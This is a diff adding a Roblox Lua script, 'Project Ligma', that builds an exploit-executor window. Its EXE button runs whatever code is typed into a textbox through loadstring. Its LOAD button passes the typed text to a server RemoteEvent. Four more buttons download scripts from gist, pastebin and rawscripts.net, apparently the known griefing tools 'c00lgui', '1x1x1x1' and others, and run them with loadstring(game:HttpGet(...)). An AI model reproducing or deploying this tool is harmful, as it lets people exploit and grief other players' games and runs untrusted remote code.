@@ -1,0 +1,367 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ProjectLigma = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local EXE = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Claer = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local Load = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local Ligma = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local UICorner_5 = Instance.new("UICorner")
+local ligmalogo = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local X = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local idk = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_9 = Instance.new("UICorner")
+local Frame2 = Instance.new("Frame")
+local UICorner_10 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local TextButton1 = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local TextButton2 = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local TextButton3 = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+
+--Properties:
+
+ProjectLigma.Name = "ProjectLigma"
+ProjectLigma.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ProjectLigma.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ProjectLigma
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.327501863, 0, 0.238805965, 0)
+Frame.Size = UDim2.new(0, 539, 0, 309)
+
+UICorner.Parent = Frame
+
+EXE.Name = "EXE"
+EXE.Parent = Frame
+EXE.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+EXE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EXE.BorderSizePixel = 0
+EXE.Position = UDim2.new(0.703153968, 0, 0.109413713, 0)
+EXE.Size = UDim2.new(0, 68, 0, 72)
+EXE.Font = Enum.Font.SourceSans
+EXE.Text = "EXE"
+EXE.TextColor3 = Color3.fromRGB(0, 0, 0)
+EXE.TextSize = 14.000
+EXE.TextWrapped = true
+
+UICorner_2.Parent = EXE
+
+Claer.Name = "Claer"
+Claer.Parent = Frame
+Claer.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+Claer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Claer.BorderSizePixel = 0
+Claer.Position = UDim2.new(0.703153968, 0, 0.383233428, 0)
+Claer.Size = UDim2.new(0, 68, 0, 72)
+Claer.Font = Enum.Font.SourceSans
+Claer.Text = "CLEAR"
+Claer.TextColor3 = Color3.fromRGB(0, 0, 0)
+Claer.TextSize = 14.000
+
+UICorner_3.Parent = Claer
+
+Load.Name = "Load"
+Load.Parent = Frame
+Load.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+Load.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Load.BorderSizePixel = 0
+Load.Position = UDim2.new(0.703153968, 0, 0.666761875, 0)
+Load.Size = UDim2.new(0, 68, 0, 72)
+Load.Font = Enum.Font.SourceSans
+Load.Text = "LOAD"
+Load.TextColor3 = Color3.fromRGB(0, 0, 0)
+Load.TextSize = 14.000
+
+UICorner_4.Parent = Load
+
+Ligma.Name = "Ligma"
+Ligma.Parent = Frame
+Ligma.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Ligma.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Ligma.BorderSizePixel = 0
+Ligma.Position = UDim2.new(0.0686456412, 0, 0, 0)
+Ligma.Size = UDim2.new(0, 84, 0, 26)
+Ligma.Font = Enum.Font.SourceSans
+Ligma.Text = " Project Ligma"
+Ligma.TextColor3 = Color3.fromRGB(0, 0, 0)
+Ligma.TextSize = 14.000
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0259740259, 0, 0.110032365, 0)
+TextBox.Size = UDim2.new(0, 357, 0, 221)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+UICorner_5.Parent = TextBox
+
+ligmalogo.Name = "ligmalogo"
+ligmalogo.Parent = Frame
+ligmalogo.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+ligmalogo.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ligmalogo.BorderSizePixel = 0
+ligmalogo.Position = UDim2.new(0.0259740259, 0, 0.854368925, 0)
+ligmalogo.Size = UDim2.new(0, 107, 0, 33)
+ligmalogo.Font = Enum.Font.SourceSans
+ligmalogo.Text = " LOAD LIGMA LOGO"
+ligmalogo.TextColor3 = Color3.fromRGB(0, 0, 0)
+ligmalogo.TextSize = 14.000
+
+UICorner_6.Parent = ligmalogo
+
+X.Name = "X"
+X.Parent = Frame
+X.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+X.BorderColor3 = Color3.fromRGB(0, 0, 0)
+X.BorderSizePixel = 0
+X.Position = UDim2.new(0.949907243, 0, 0, 0)
+X.Size = UDim2.new(0, 27, 0, 26)
+X.Font = Enum.Font.SourceSans
+X.Text = "X"
+X.TextColor3 = Color3.fromRGB(0, 0, 0)
+X.TextSize = 14.000
+
+UICorner_7.Parent = X
+
+idk.Name = "idk"
+idk.Parent = Frame
+idk.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+idk.BorderColor3 = Color3.fromRGB(0, 0, 0)
+idk.BorderSizePixel = 0
+idk.Position = UDim2.new(0.890538037, 0, 0, 0)
+idk.Size = UDim2.new(0, 27, 0, 26)
+idk.Font = Enum.Font.SourceSans
+idk.Text = "-"
+idk.TextColor3 = Color3.fromRGB(0, 0, 0)
+idk.TextSize = 14.000
+
+UICorner_8.Parent = idk
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Size = UDim2.new(0, 46, 0, 33)
+ImageLabel.Image = "rbxassetid://82961747622994"
+ImageLabel.ScaleType = Enum.ScaleType.Fit
+
+UICorner_9.Parent = ImageLabel
+
+Frame2.Name = "Frame2"
+Frame2.Parent = Frame
+Frame2.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame2.BorderSizePixel = 0
+Frame2.Position = UDim2.new(0.844155848, 0, 0.110032365, 0)
+Frame2.Size = UDim2.new(0, 77, 0, 244)
+
+UICorner_10.Parent = Frame2
+
+TextButton.Parent = Frame2
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0, 0, 0.0286885239, 0)
+TextButton.Size = UDim2.new(0, 77, 0, 13)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "c00lgui.rar"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+
+UICorner_11.Parent = TextButton
+
+TextButton1.Name = "TextButton1"
+TextButton1.Parent = Frame2
+TextButton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton1.BorderSizePixel = 0
+TextButton1.Position = UDim2.new(0, 0, 0.118852459, 0)
+TextButton1.Size = UDim2.new(0, 77, 0, 13)
+TextButton1.Font = Enum.Font.SourceSans
+TextButton1.Text = "1x1x1x1 Gui"
+TextButton1.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton1.TextSize = 14.000
+
+UICorner_12.Parent = TextButton1
+
+TextButton2.Name = "TextButton2"
+TextButton2.Parent = Frame2
+TextButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton2.BorderSizePixel = 0
+TextButton2.Position = UDim2.new(0, 0, 0.209016398, 0)
+TextButton2.Size = UDim2.new(0, 77, 0, 13)
+TextButton2.Font = Enum.Font.SourceSans
+TextButton2.Text = "MLG GUN"
+TextButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton2.TextSize = 14.000
+
+UICorner_13.Parent = TextButton2
+
+TextButton3.Name = "TextButton3"
+TextButton3.Parent = Frame2
+TextButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton3.BorderSizePixel = 0
+TextButton3.Position = UDim2.new(0, 0, 0.29429853, 0)
+TextButton3.Size = UDim2.new(0, 77, 0, 12)
+TextButton3.Font = Enum.Font.SourceSans
+TextButton3.Text = "T0pk3k"
+TextButton3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton3.TextSize = 14.000
+
+UICorner_14.Parent = TextButton3
+
+-- Scripts:
+
+local function LWBCOJS_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	-- Made by Real_IceyDev (@lceyDex) --
+	-- Simple UI dragger (PC Only/Any device that has a mouse) --
+	
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(LWBCOJS_fake_script)()
+local function PCUL_fake_script() -- EXE.LocalScript 
+	local script = Instance.new('LocalScript', EXE)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(script.Parent.Parent.TextBox.Text)()
+	end)
+end
+coroutine.wrap(PCUL_fake_script)()
+local function VUCB_fake_script() -- Claer.LocalScript 
+	local script = Instance.new('LocalScript', Claer)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.TextBox.Text = " "
+	end)
+end
+coroutine.wrap(VUCB_fake_script)()
+local function VYBNQPP_fake_script() -- Load.LocalScript 
+	local script = Instance.new('LocalScript', Load)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.ReplicatedStorage.RemoteEvent:FireServer(script.Parent.Parent.TextBox.Text)
+	end)
+	
+end
+coroutine.wrap(VYBNQPP_fake_script)()
+local function TUWSJX_fake_script() -- ligmalogo.LocalScript 
+	local script = Instance.new('LocalScript', ligmalogo)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		
+	end)
+	
+end
+coroutine.wrap(TUWSJX_fake_script)()
+local function EHDZ_fake_script() -- X.LocalScript 
+	local script = Instance.new('LocalScript', X)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(EHDZ_fake_script)()
+local function DFDZCQ_fake_script() -- idk.LocalScript 
+	local script = Instance.new('LocalScript', idk)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		
+	end)
+end
+coroutine.wrap(DFDZCQ_fake_script)()
+local function ASFCEIZ_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/Friendosie/efc3ea3c8c9f58aae41497e22df56602/raw/ebcd32b54cc4fd1a2ad2c57b25cb3e613937ddc0/c00lkiddd%2520gui%2520reborn"))()
+	end)
+	
+end
+coroutine.wrap(ASFCEIZ_fake_script)()
+local function UZYBV_fake_script() -- TextButton1.LocalScript 
+	local script = Instance.new('LocalScript', TextButton1)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/9VgHWAp8"))()
+	end)
+end
+coroutine.wrap(UZYBV_fake_script)()
+local function PYCKCDQ_fake_script() -- TextButton2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Client-Replication-the-ss-loadstring-script-27393"))()
+	end)
+end
+coroutine.wrap(PYCKCDQ_fake_script)()
+local function BRXWGVB_fake_script() -- TextButton3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Idk-script-2-28418"))()
+	end)
+end
+coroutine.wrap(BRXWGVB_fake_script)()
